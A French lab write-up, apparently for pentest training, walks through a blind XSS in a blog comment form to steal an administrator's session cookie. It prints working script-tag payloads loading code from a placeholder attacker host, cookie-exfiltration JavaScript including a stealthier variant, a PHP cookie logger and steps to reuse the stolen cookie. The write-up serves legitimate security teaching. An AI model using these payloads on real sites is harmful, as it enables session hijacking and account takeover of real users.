# Lab - Blog et vol de session

## Scénario

On intervient sur un test d'intrusion web pour une entreprise qui vient de mettre en ligne son blog dédié à la cybersécurité. La phase de test XSS du plan d'audit commence. L'application est un blog classique avec système de commentaires, et l'objectif est de déterminer si un attaquant peut exploiter une faille XSS pour voler la session d'un administrateur qui consulte les commentaires soumis.

Le contexte est celui d'une Blind XSS : on ne voit pas directement le rendu de notre payload, car les commentaires sont modérés et consultés depuis un panneau d'administration auquel on n'a pas accès.

{% hint style="info" %}
En situation réelle, les formulaires dont la sortie est visible uniquement par un administrateur (commentaires modérés, tickets de support, formulaires de contact) sont des cibles privilégiées pour la Blind XSS.
{% endhint %}

## Approche

La stratégie se décompose en trois temps :

1. **Reconnaissance du blog** : explorer les pages, identifier les points d'entrée utilisateur (formulaire de commentaire, champs de profil, etc.)
2. **Détection de la Blind XSS** : injecter des payloads qui chargent un script distant depuis notre machine. Si l'administrateur consulte notre commentaire et que le payload s'exécute, on reçoit une requête sur notre listener. On teste chaque champ séparément pour isoler celui qui est vulnérable.
3. **Exploitation par vol de cookie** : une fois le champ vulnérable identifié, on injecte un payload qui exfiltre les cookies de l'administrateur vers notre serveur.

{% hint style="warning" %}
La Blind XSS demande de la patience. On ne reçoit un retour que lorsque la victime (ici l'admin) consulte la page contenant notre payload. Il faut garder le listener actif et attendre.
{% endhint %}

## Commandes

### Mise en place du listener

On commence par préparer un serveur PHP sur notre machine Exegol pour recevoir les callbacks :

```bash
mkdir /tmp/xss-lab
cd /tmp/xss-lab
sudo php -S 0.0.0.0:4444
```

### Identification du champ vulnérable

On soumet un commentaire sur le blog en injectant un payload de test dans chaque champ du formulaire. L'idée est d'utiliser le nom du champ dans l'URL pour savoir lequel déclenche l'exécution :

```html
"><script src=http://<IP_ATTAQUANT>:4444/fullname></script>
"><script src=http://<IP_ATTAQUANT>:4444/username></script>
"><script src=http://<IP_ATTAQUANT>:4444/website></script>
"><script src=http://<IP_ATTAQUANT>:4444/comment></script>
```

On renseigne chaque champ avec le payload correspondant, puis on soumet le formulaire. Sur le listener, on surveille les requêtes entrantes :

```bash
# - Sortie du listener PHP
[200]: GET /website - No such file or directory
```

Le champ qui génère un callback est le champ vulnérable. Dans cet exemple, c'est le champ lié à l'URL du site web.

{% hint style="success" %}
En testant chaque champ avec un identifiant unique dans l'URL, on sait exactement quel input déclenche l'exécution JavaScript coté admin, sans avoir besoin d'accès au panneau d'administration.
{% endhint %}

### Préparation du script d'exfiltration

On crée un fichier `script.js` qui sera chargé par le navigateur de l'administrateur. Ce script redirige la victime vers notre serveur en transmettant ses cookies dans l'URL :

```javascript
document.location='http://<IP_ATTAQUANT>:4444/index.php?c='+document.cookie;
```

On peut aussi utiliser une variante plus discrète qui ne redirige pas la victime :

```javascript
new Image().src='http://<IP_ATTAQUANT>:4444/index.php?c='+document.cookie;
```

{% hint style="info" %}
La méthode `new Image()` est plus furtive car elle ne provoque aucune redirection visible. La victime ne remarque rien, alors que la première méthode la redirige vers notre serveur, ce qui peut éveiller les soupçons.
{% endhint %}

On peut aussi préparer un script PHP (`index.php`) pour enregistrer proprement les cookies dans un fichier :

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

On relance le serveur PHP depuis le répertoire contenant `script.js` et `index.php` :

```bash
cd /tmp/xss-lab
sudo php -S 0.0.0.0:4444
```

### Injection du payload final

On soumet un nouveau commentaire en plaçant le payload dans le champ vulnérable identifié précédemment :

```html
"><script src=http://<IP_ATTAQUANT>:4444/script.js></script>
```

Les autres champs du formulaire peuvent contenir des valeurs quelconques.

### Réception des cookies

Quand l'administrateur consulte le commentaire, on observe deux requêtes sur notre listener :

```bash
# - Requête 1 : chargement du script
[200]: GET /script.js

# - Requête 2 : exfiltration des cookies
[404]: GET /index.php?c=cookie_session=abc123def456;%20flag=VALEUR_DU_FLAG
```

Si on a mis en place le script PHP, les cookies sont aussi consignés dans `cookies.txt` :

```bash
cat cookies.txt
# Victim IP: <IP_CIBLE> | Cookie: cookie_session=abc123def456
# Victim IP: <IP_CIBLE> | Cookie: flag=VALEUR_DU_FLAG
```

### Utilisation du cookie volé

On peut maintenant utiliser le cookie de session récupéré pour se connecter en tant qu'administrateur. Dans Firefox, on ouvre les DevTools (`Shift+F9`), on accède au stockage des cookies, et on ajoute manuellement le cookie volé (nom et valeur). Après rechargement de la page de connexion, on est authentifié en tant qu'admin.

## Ce qu'on en retient

{% hint style="success" %}
**Blind XSS et patience** : contrairement aux XSS classiques ou l'on voit immédiatement le résultat, la Blind XSS exige d'attendre que la victime déclenche le payload. C'est un scénario réaliste en pentest, notamment sur les formulaires de contact et les systèmes de tickets.
{% endhint %}

La méthodologie complète tient en quatre étapes :

| Étape | Action | Indicateur de succès |
|---|---|---|
| Reconnaissance | Explorer l'application, repérer les inputs | Formulaire de commentaire identifié |
| Détection | Payloads avec callback par champ | Requête reçue sur le listener |
| Exploitation | Script d'exfiltration de cookies | Cookie de session capturé |
| Accès | Injection du cookie dans le navigateur | Connexion en tant qu'admin |

Quelques points a retenir :

- Tester chaque champ individuellement avec un identifiant unique permet d'isoler le point d'injection sans accès au panneau d'administration.
- La variante `new Image()` est préférable a `document.location` pour rester discret, car elle ne redirige pas le navigateur de la victime.
- En engagement réel, on documente le champ vulnérable, le payload utilisé, et l'impact (accès administrateur) pour le rapport final.
- Les protections comme `HttpOnly` sur les cookies empêchent ce type d'attaque. L'absence de ce flag est un finding a remonter systématiquement.

***
